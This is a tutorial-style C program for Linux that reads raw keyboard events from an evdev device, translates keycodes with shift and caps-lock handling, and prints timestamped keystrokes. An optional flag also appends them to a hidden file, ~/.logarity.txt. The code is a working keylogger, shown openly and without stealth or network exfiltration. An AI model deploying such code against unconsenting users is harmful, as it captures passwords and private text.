#include <linux/input.h>
// this is for the input_event struct that is defined as the follows :
/*
struct input_event {
    struct timeval time;
    unsigned short type;
    unsigned short code;
    int value;
};
 */
#include <linux/input-event-codes.h>
// the input event codes like KEY_A, KEY_LEFTSHIFT, etc are defined here. (int)
#include <stdio.h>
// for perror, fflush, etc.
#include <stdbool.h>
// for true, false
#include <fcntl.h>
// file control : for O_RDONLY flags.
#include <stdlib.h>
#include <unistd.h>
// kernel syscalls : open, close, read, etc.

#include <time.h>
// for time logging. 

#include <string.h> 
// for string operations and comparisions.


//-------------------------------------------------------[GLOBAL PROPERTIES]

// if shift is pressed.
bool shift_pressed = false;
bool is_logged_to_file = false;
bool is_capson = false;
// define a struct if the character is normal, shift pressed.
typedef struct {
    // a char pointer to normal character.
    const char *normal;
    // a char pointer to shifted character.
    const char *shifted;
} KeyEntry;

// Indexed directly by keycode. KEY_MAX is defined in input-event-codes.h, this is the array of KeyEntry.
static const KeyEntry keymap[KEY_MAX + 1] = {
    // Letters and their shift equivalent.
    [KEY_A] = {"a", "A"},
    [KEY_B] = {"b", "B"},
    [KEY_C] = {"c", "C"},
    [KEY_D] = {"d", "D"},
    [KEY_E] = {"e", "E"},
    [KEY_F] = {"f", "F"},
    [KEY_G] = {"g", "G"},
    [KEY_H] = {"h", "H"},
    [KEY_I] = {"i", "I"},
    [KEY_J] = {"j", "J"},
    [KEY_K] = {"k", "K"},
    [KEY_L] = {"l", "L"},
    [KEY_M] = {"m", "M"},
    [KEY_N] = {"n", "N"},
    [KEY_O] = {"o", "O"},
    [KEY_P] = {"p", "P"},
    [KEY_Q] = {"q", "Q"},
    [KEY_R] = {"r", "R"},
    [KEY_S] = {"s", "S"},
    [KEY_T] = {"t", "T"},
    [KEY_U] = {"u", "U"},
    [KEY_V] = {"v", "V"},
    [KEY_W] = {"w", "W"},
    [KEY_X] = {"x", "X"},
    [KEY_Y] = {"y", "Y"},
    [KEY_Z] = {"z", "Z"},

    // Numbers row and their shift equivalent symbols : US, QWERTY Keyboard layout. (it would be wrong in case of other layouts.)
    [KEY_1] = {"1", "!"},
    [KEY_2] = {"2", "@"},
    [KEY_3] = {"3", "#"},
    [KEY_4] = {"4", "$"},
    [KEY_5] = {"5", "%"},
    [KEY_6] = {"6", "^"},
    [KEY_7] = {"7", "&"},
    [KEY_8] = {"8", "*"},
    [KEY_9] = {"9", "("},
    [KEY_0] = {"0", ")"},

    // Symbols (I am using the same, US QWERTY Layout.)
    [KEY_MINUS]      = {"-", "_"},
    [KEY_EQUAL]      = {"=", "+"},
    [KEY_LEFTBRACE]  = {"[", "{"},
    [KEY_RIGHTBRACE] = {"]", "}"},
    [KEY_BACKSLASH]  = {"\\", "|"},
    [KEY_SEMICOLON]  = {";", ":"},
    [KEY_APOSTROPHE] = {"'", "\""},
    [KEY_GRAVE]      = {"`", "~"},
    [KEY_COMMA]      = {",", "<"},
    [KEY_DOT]        = {".", ">"},
    [KEY_SLASH]      = {"/", "?"},
    [KEY_SPACE]      = {" ", " "},

    // These are the control keys, like CTRL, SHIFT, etc. We would not have a shift equivalent for them, so we put NULL there, and then output like if (!NULL) kinda usage.
    [KEY_ENTER]      = {"[ENTER]", NULL},
    [KEY_ESC]        = {"[ESC]", NULL},
    [KEY_TAB]        = {"[TAB]", NULL},
    [KEY_BACKSPACE]  = {"[BACKSPACE]", NULL},
    [KEY_LEFTCTRL]   = {"[CTRL] + ", NULL},
    [KEY_RIGHTCTRL]  = {"[CTRL] + ", NULL},
    [KEY_LEFTALT]    = {"[ALT] + ", NULL},
    [KEY_RIGHTALT]   = {"[ALT] + ", NULL},
    [KEY_LEFTMETA]   = {"[SUPER] + ", NULL},
    [KEY_RIGHTMETA]  = {"[SUPER] + ", NULL},
    [KEY_CAPSLOCK]   = {"[CAPSLOCK]", NULL},

    // Function Keys.
    [KEY_F1]  = {"[F1]", NULL},
    [KEY_F2]  = {"[F2]", NULL},
    [KEY_F3]  = {"[F3]", NULL},
    [KEY_F4]  = {"[F4]", NULL},
    [KEY_F5]  = {"[F5]", NULL},
    [KEY_F6]  = {"[F6]", NULL},
    [KEY_F7]  = {"[F7]", NULL},
    [KEY_F8]  = {"[F8]", NULL},
    [KEY_F9]  = {"[F9]", NULL},
    [KEY_F10] = {"[F10]", NULL},
    [KEY_F11] = {"[F11]", NULL},
    [KEY_F12] = {"[F12]", NULL},

    // Direction/Arrow keys.
    [KEY_UP]    = {"[UP]", NULL},
    [KEY_DOWN]  = {"[DOWN]", NULL},
    [KEY_LEFT]  = {"[LEFT]", NULL},
    [KEY_RIGHT] = {"[RIGHT]", NULL},
};
// Basically, what is above is of type KeyEntry *, an array of KeyEntry.
// Each of which is of type KeyEntry, and each of the value in struct whose type is char *.


// a function to return the event time.
char *return_event_time(struct input_event ev) {
    // Convert the seconds field to a local time structure
    time_t seconds = ev.time.tv_sec;
    struct tm *time_info = localtime(&seconds);

    // Then we need to format the base date and time string
    char time_buffer[40];
    strftime(time_buffer, sizeof(time_buffer), "%Y-%m-%d %H:%M:%S", time_info);

    // Finally return the human-readable time alongside the exact microseconds
    int length = snprintf(NULL, 0, "[%s.%02ld]\n", time_buffer, (long)ev.time.tv_usec/10000);

    // and here that we use malloc, we need to free it later.
    // length + 1 : for the final null terminator.
    char *format_buffer = malloc(length + 1);

    // see man 3 snprintf
    // divide the ev.time.tv_usec by 10000 to make it a 2 decimal point.
    snprintf(format_buffer, length + 1, "[%s.%02ld]", time_buffer, (long)ev.time.tv_usec/10000);

    // return
    return format_buffer;
}



// Returns the string to print or log. NULL if this keycode has no mapping.
// Let us now define a function called translate_key which returns a string (char pointer).
// It will determine what key will be returned based on taking input : keycode
const char *translate_key(int keycode) {
    if (keycode < 0 || keycode > KEY_MAX)
        return NULL;
    // if the keycode is out of range (not in 0 to KEY_MAX), returns null.

    const KeyEntry *e = &keymap[keycode];
    // we cannot use like keycode >= KEY_A kinda thing, because the keymaps are not continous.
    bool is_letter = (e->normal && e->shifted && e->normal[0] >= 'a' && e->normal[0] <= 'z' && e->shifted[0] >= 'A' && e->shifted[0] <= 'Z' && e->normal[1] == '\0' && e->shifted[1] == '\0');
    // gets the pointer to the struct of particular keycode among the keymap.
    // the capslock?
    // caps xor shift : when caps on and shift off, shifted..
    //                : when caps off and shift on, shifted..
    //                : when caps off and shift off, normal..
    //                : when caps on  and shift on, normal..
    if (is_letter && (shift_pressed ^ is_capson) && e->shifted) return e->shifted;
    // first this superset case is evaluated.
    // if the shift_pressed == true and there exists a shift counterpart for that keycode,then return the shift counterpart.
    if (shift_pressed && e->shifted ) return e->shifted;
    // else, return the normal character.
    // typeof(e->normal) = char *
    return e->normal; // falls back here whether shift is off, or key has no shifted form
}

// main function.
int main(int argc, char *argv[argc + 1]) {
    // check if any argument is provided.
    // if no argument is provided, then return the following.
    if (argc < 2) {
        fprintf(stderr, "Usage: %s /dev/input/eventX\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (argc >= 3 && (strcmp(argv[2], "--log") == 0 || strcmp(argv[2], "-l") == 0)) is_logged_to_file = true;

    // open the first argument provided along with the executable.
    int fd = open(argv[1], O_RDONLY);
    // if it failed, perror and return with exit failure.
    if (fd < 0) {
        perror("open");
        return EXIT_FAILURE;
    }

    // initialise the input_event struct.
    struct input_event ev;
    char *user = getenv("HOME");
    puts(user);
    int pathlen = snprintf(NULL, 0, "%s/.logarity.txt", user);
    char path[pathlen + 1];
    snprintf(path, pathlen + 1, "%s/.logarity.txt", user);

    // open the log file if it is allowed to log seperately to a file.
    FILE *logfile = fopen(path, "a");
    if (!logfile) {
        perror("fopen failed");
        is_logged_to_file = false;
    }

    // while loop : read the input file : fd
    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {

        // if the event type is not equal to ev_key (that is a keyboard key input), then continue.
        if (ev.type != EV_KEY)
            continue;

        // if the event code is left shift, or right sift, then toggle the boolean value.
        if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
            shift_pressed = (ev.value != 0);
            continue;
        }
        if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
            is_capson = !is_capson;
            continue;
        }

        if (ev.value == 1 || ev.value == 2) { // press or autorepeat
            const char *s = translate_key(ev.code);
            // if it is a valid string (not null), proceed outputing.
            if (s) {
                // the classic snprintf formatting.
                char *timestamp = return_event_time(ev);
                int length = snprintf(NULL, 0, "%s : %s\n", timestamp, s);
                char output[length + 1];
                snprintf(output, length + 1, "%s : %s\n", timestamp, s);
                // never forget to free the buffer. (every malloc has equivalent free.);
                free(timestamp);

                if (is_logged_to_file) {
                    fputs(output, logfile);
                    fflush(logfile);
                }
                fputs(output, stdout);
                fflush(stdout);
            }
        }
    }

    // close the fd,
    if (is_logged_to_file) fclose(logfile);
    close(fd);

    return EXIT_SUCCESS;
}


// See Also, evdev.c : the basic implementation of this.
